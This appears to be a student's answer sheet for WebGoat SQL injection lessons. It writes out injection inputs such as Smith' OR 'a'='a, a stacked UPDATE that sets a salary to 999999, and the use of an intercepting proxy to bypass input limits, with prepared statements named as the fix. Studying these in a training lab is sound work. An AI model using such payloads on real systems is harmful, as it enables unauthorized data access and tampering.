5. Lesson: String SQL Injection
1)SQL statement used
	SELECT * FROM user_data WHERE last_name = 'Smith'
2)Modified SQL statement used for the SQL injection. How did it work?
	SELECT * FROM user_data WHERE last_name = 'Smith' OR 'a' = 'a'
	The input is Smith' OR 'a'='a, where the first single quote will complete the input name and the rest input and the last single quote will form a contion that holds true for every records. Thus all the record are displayed.
3)How didi WebGoat fix the vulnerability?(Hint: See 'Show Java' tab)?
	Using prepared statements.

6. Lesson: LAB: SQL injection
	Stage 1: String SQL injection
	1)SQL statement used
	SELECT * FROM employee WHERE userid = '112' and password = 'aa'
	2)Modified SQL statement used for the SQL injection. How did it work?
	SELECT * FROM employee WHERE userid = '112' and password = 'aa' OR 'a' = 'a'
	We try to modify the input to be aa' OR 'a'='a, where the first single quote will complete the input name and the rest input and the last single quote will form a condition that holds true forever. But the website has a limitation of the length of my input. To overcome this, WebSacrab is used to intercept and change the request send to the server, thus we can do SQL injection finally.

	Using prepared statements.

	Stage 2: Parameterized Query #1
	Skipped due to the requirement of development version.

	Stage 3: Numeric SQL injection
	1)SQL statement used
	SELECT * FROM employee WHERE userid = '101' and password = 'larry'
	
	2)Modified. How?
	SELECT * FROM employee WHERE userid = '101' and password = 'larry' OR 'a'='a'

	3)How fix?

7. Lesson: Modify data with SQL injeciton
	1)SQL used
	SELECT userid, salary FROM employee WHERE userid = 'jsmith'
	2)Modify. How work?
	SELECT userid, salary FROM employee WHERE userid = 'jsmith'; UPDATE salaries SET salary=999999 WHERE userid='jsmith'
	By using a ";" after the parameter, we can execture another SQL statement which can modify the data in the database.
